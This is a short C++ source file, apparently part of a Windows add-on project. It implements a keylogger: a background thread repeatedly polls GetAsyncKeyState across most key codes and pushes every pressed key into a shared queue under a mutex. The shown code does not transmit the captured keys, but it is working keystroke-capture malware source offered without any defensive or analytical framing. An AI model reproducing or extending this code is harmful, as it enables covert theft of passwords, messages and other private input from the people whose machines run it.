#pragma once

#include "keylog.h"



extern addonThread* gThread;
extern addonMutex* gMutex;
extern addonKeylog* gKeylog;


std::queue<char> keyQueue;





addonKeylog::addonKeylog()
{
	this->keylogThread = NULL;

	this->keylog_active = true;
	this->keylogThread = gThread->Start((LPTHREAD_START_ROUTINE)keylog_thread);
}



addonKeylog::~addonKeylog()
{
	this->keylog_active = false;

	gThread->Stop(this->keylogThread);
}



DWORD _stdcall keylog_thread(LPVOID lpParam)
{
	while(gKeylog->keylog_active)
	{
		for(char q = 8; q != 191; q++)
		{
			if(GetAsyncKeyState(q) == -32767)
			{
				gMutex->Lock();
				keyQueue.push(q);
				gMutex->unLock();
			}
		}

		Sleep(1);
	}

	return 1;
}